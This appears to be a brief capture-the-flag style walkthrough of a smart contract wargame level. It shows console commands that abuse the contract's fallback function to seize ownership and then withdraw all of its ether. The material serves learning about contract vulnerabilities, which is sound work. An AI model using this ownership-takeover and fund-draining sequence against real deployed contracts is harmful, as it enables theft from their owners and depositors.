# How can I become the owner of this contract?

: contribute function limits the amount of ether I can send to the contract to less than 0.001 ether. Within the same function, unless I send the contract more than the current owner's contributions, I cannot become the new owner. 

: My next option is to use the fallback function. To pass the requirements, I took the steps below.

1. Use contribute function to add my contributions. 
`contract.contribute({value:1})`
2. Check `msg.sender`'s contributions
`(await contract.getContribution()).toNumber()`
3. Use a function, that is not defined yet payable in the contract. This will fire the contract's fallback function.
`contract.sendTransaction({value:1})`
4. Check the new owner. 
`await contract.owner()`
5. As the new owner, `msg.sender` can now withdraw all existing funds.
`contract.withdraw()`
6. Check if the contract's balance is 0.
`await getBalance(contract.address)`